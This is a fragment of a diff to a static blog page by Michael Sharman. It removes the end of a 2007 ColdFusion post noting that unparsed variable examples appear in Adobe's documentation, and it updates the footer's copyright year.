-<p>Also funny to note that although the docs site is much better for ColdFusion 8, many of the examples using ColdFusion variables are not parsed. So you get examples like #Round(7.49)#.</p>
-
-<p>Hopefully Adobe will rectify this soon.</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2007-10-12T15:26:01+10:00" pubdate data-updated="true">Oct 12<span>th</span>, 2007</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/categories/coldfusion/'>ColdFusion</a>
-
-
-</div>
-	
-		<div class="comments"><a href="/2007/10/12/coldfusion-round-docs-inaccurate//page/16/index.html#disqus_thread">Comments</a></div>
-	
-</div></article>
-
 <nav id="pagenavi">
     
         <a href="/page/15/" class="prev">Prev</a>
@@ -884,7 +1061,7 @@ I&#8217;ve been annoyed many times with the whole chr(10)chr(13) on Windows vs c
     
     <div class="center"><a href="/blog/archives">Blog Archives</a></div>
 </nav></div>
-	<footer id="footer" class="inner">Copyright &copy; 2013
+	<footer id="footer" class="inner">Copyright &copy; 2015
 
     Michael Sharman
 
